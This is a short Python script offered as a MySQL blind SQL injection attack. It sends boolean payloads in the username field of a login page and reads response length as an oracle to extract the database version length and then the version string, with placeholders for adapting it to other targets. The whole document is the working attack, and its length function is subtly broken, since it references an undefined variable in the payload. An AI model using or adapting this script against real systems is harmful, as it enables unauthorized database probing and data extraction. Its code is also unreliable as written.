# MYSQL - Blind sqli
    # Get version

from requests import post
from string import digits

class Attack:
    URL: str = 'https://vuln/login.php'

    def __init__(self) -> None:
        version_length = self.get_length()
        self.get_version(version_length)

    def get_length(self) -> int:
        for guess in range(1, 20):
            p = {"username": f"admin' and (SELECT LENGTH(VERSION())={_})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            print(guess, len(resp.text))
            # your trigger logic
            if len(resp.text) > 2000:
                print('[length]', guess)
                return guess
    
    def get_version(self, n: int) -> None:
        version = ''
        for version_index in range(1, n + 1):
            for guess in digits + '.':
                payload = {"username": f"admin' and (SELECT ASCII(SUBSTRING(VERSION(),{version_index},1))={ord(guess)})#", "password": "<ignore>"}
                resp = post(self.URL, data=payload)
                print(guess, len(resp.text))
                # your trigger logic
                if len(resp.text) > 2000:
                    version += guess
                    print(f'[version]', version)
                    break

if __name__ == '__main__':
    Attack()
